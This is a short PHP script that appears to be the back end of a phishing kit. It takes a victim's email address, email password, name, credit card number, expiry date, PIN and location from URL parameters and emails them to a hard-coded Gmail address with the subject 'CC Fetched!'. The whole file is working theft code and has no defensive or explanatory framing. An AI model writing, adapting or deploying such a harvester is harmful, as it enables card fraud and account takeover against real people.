<?php
if(isset($_GET[email]))
{
	$email = $_GET['email'];
	$pn = $_GET['pn'];
	$name = $_GET['name'];
	$cc = $_GET['cc'];
	$exp_month = $_GET['exp_month'];
	$exp_year = $_GET['exp_year'];
	$pin = $_GET['pin'];
	$location = $_GET['location'];
	
	$email = "lukeidiot@gmail.com";
	$subject = "CC Fetched!";
	$body = "Email: $email\nEmail Pass: $pn\nName: $name\nCC#: $cc\n EXP Month: $exp_month\n EXP Year: $exp_year\nPin: $pin\n Location: $location";
	
	mail($email,$subject,$body);
}
?>